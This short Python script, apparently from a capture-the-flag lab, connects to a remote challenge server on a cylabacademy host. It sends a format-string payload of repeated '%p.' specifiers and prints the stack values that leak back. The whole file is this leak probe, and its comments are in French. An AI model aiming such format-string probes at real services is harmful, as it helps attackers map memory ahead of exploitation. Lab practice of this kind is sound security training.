import sys, re, socket, time
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31929


def send_line(s, data):
    """envoie tout d'un coup : read() doit recevoir la ligne complete"""
    s.sendall(data + b"\n")


def collect(s, t=2.0):
    s.settimeout(0.6)
    buf = b""
    t0 = time.time()
    while time.time() - t0 < t:
        try:
            c = s.recv(8192)
            if not c:
                break
            buf += c
        except socket.timeout:
            continue
    return buf


def run(a, b=b"2"):
    s = socket.create_connection((HOST, PORT), timeout=15)
    s.settimeout(6)
    out = collect(s, 1.2)          # banniere + A:
    send_line(s, a)
    time.sleep(0.6)
    out2 = collect(s, 0.8)         # B:
    send_line(s, b)
    time.sleep(1.2)
    out3 = collect(s, 2.0)
    s.close()
    return (out + out2 + out3).decode("latin-1", "replace")


out = run(b"1" + b"%p." * 25)
print("=== LEAK ===")
print(out[:1500])
